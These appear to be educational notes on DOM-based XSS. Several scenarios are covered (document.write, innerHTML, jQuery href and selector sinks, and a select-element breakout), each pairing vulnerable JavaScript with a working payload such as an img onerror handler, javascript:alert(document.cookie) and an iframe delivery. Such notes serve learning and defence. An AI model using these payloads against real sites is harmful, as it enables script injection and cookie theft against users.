# Function that uses "document.write()" and concatenation of the input string

### Scenario

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```
With the document.write function it writes the "img" tag with the specified "src" parameter. In it there is a concatenation with the parameter that the user give to the page.

The parameter is taken from window.location.search and the parameter name is "search". If the is not empty then the JS function "trackSearch" is called.

N.B.: the window.location.search take anything which comes after the question mark in the URL.

In the DOM the passed element is displayed in the "img" tag created by the JS function:
```html
<img src="/resources/images/tracker.gif?searchTerms=test">
```

### Exploitation

We can pass this string as input:

```
test" onload=alert()
```

Here, what happens is the following:
- The img tag is created as shown before;
- Now, due to the presence of " we are able to break the string automatically created by the JS function;
- The image is actually loaded, but given the presence of the onload action we inserted, the action specified in it will be perfomed after the image loading;
- We inserted the alert() function in the onload action, so we expect to see an alert box on the web page;
- We cannot close the " because there is that already inserted by the JS function.

The HTML resulting from this input is the following:
```html
<img src="/resources/images/tracker.gif?searchTerms=test" onload=alert()">
```

# INNER.html sink using source "location.search"

### Scenario

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```

This JS code snippet takes the input string with "window.location.search" and takes the parameter called "search".

This string is passed to the JS function and used with the innerHTML.

DOM in which the input is diplayed:

```html
<span id="searchMessage">uniquetest</span>
```

In innerHTML if we pass a <script> tag it won't be executed. This is a security feature. So we need to pass something else.

### Exploit
We can use:
```
<img src='0' onerror=alert()>
```
The src provided will cause an error and onerror we load the alert() function.
As we seen before the "script" tag is not executed but not the "img" tag.

The DOM modified is the following:
```html
<span id="searchMessage">
    <img src="0" onerror="alert()">
</span>
```

# DOM XSS in JQuery anchor href attribute sink using location.search source

### Scenario
JQuery is a JS framework with a little bit different syntax from vanilla JS.

```html
<a id="backLink" href="/">Back</a>
```

This back link on the page, redirect the users to the previous page.

The href is populated by a JQuery script.

```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

- $('#backLink') this select the element with the id="backLink";
- attr("href") go inside the attribute href in the selected ID;
- Assign to this attribute the value retrieved from the URL parameter called "returnPath".

### Exploit
If we have an anchor tag (<a>) and inside the href parameter of it we have "javascript:SOMEJS", SOMEJS will be executed directly.


We can assign to the returnPath URL parameter something like this:
```
javascript:alert(document.cookie)
```

Resulting DOM:
```html
<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
```

When we will click on the link on the web page, the JS will be executed. We will get an alert with the cookie shown inside.

# JQuery selector sink using hashchange

### Scenario

In the page source, we can see the following JS script:
```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

What's an **hashchange event**?
You can put an hashtag (#) at the end of the url followed by a number or a word.
It's often used as bookmarking functionality.

The JS function showed creates a variable called "post".
It assign to the variable the content of the h2 tag which contains the value of the hashchange we pass to the URL parameter contained inside the section "blog-list".

Clearly, the "contains" method search for a value that we can manipulate.

N.B.: **In some version of JQuery the function "contains" may behave as unexpectedly**. So, if we try to give to it the argument ```<h1> somethingUNIQUE </h1>``` and print the variabile "post" we may notice that post variable contains our h1 tag.
**In other words, the contains method created the object passed as argument to it.**
This DOM element isn't inserted in the page, but it's a **detached DOM element**.

We can give it a parent node, so, in other words, we can attach in to the DOM of the web page:

```javascript
var mynode = document.getElementById("something");
mynode.appendChild(post)
```

### Exploit

We can exploit the vulnerability above, by using a tag like "<img>" and forcing it to the error and hen using a onerror functionality.

```javascript
let myimg = document.createElement('img')
myimg.src = 0 //nosense value of the src
```

We can pass it as payload:

```html
<img src=0 onerror='alert()'>
```

In this case we can avoid to attach this img tag to the web page DOM because we can notice from the network connection panel of our browser that it calls immediatly the "src" location although this "img" tag isn't attached to the DOM of the web page.

In some case, we can deliver a simiilar payload using **"iframe"**:
```html
<iframe src="https://theVulnerablePageURL/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

This code load the vulnerable page inside a box (the iframe) and then append to the URL in the src field the hashchange value which exploits the vulnerability.

# DOM XSS in document.write sink using source location.search inside a select element

### Scenario

We have a **shop page** with different products. If we scroll down, after entering one product page, we notice that there is a dropdown box with different location which represents different stocks.

```html
<select name="storeId">
    <option>London</option>
    <option>Paris</option>
    <option>Milan</option>
</select>
```
Above that select element there is a JS script:

```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

In this code, an array is created and assign to a variable. The array has three elements.
Another variable take the value contained inside the URL parameter "storeId".
If a value is passed and the value passed is not already in the array, the JS created it and append it to the array.

### Exploit
We can add a URL parameter like this:
```
URL/productId="1"&storeId=test</select>
```

The select will break the DOM.

Complete exploit:
```
URL/productId="1"&storeId=test</select><img src="1" onerror="alert()">
```

The resulting DOM after the exploit is:
```html
<select name="storeId">
    <option selected="">test</option>
</select>
<img src="1" onerror="alert()">
<option>London</option>
<option>Paris</option>
<option>Milan</option>
```
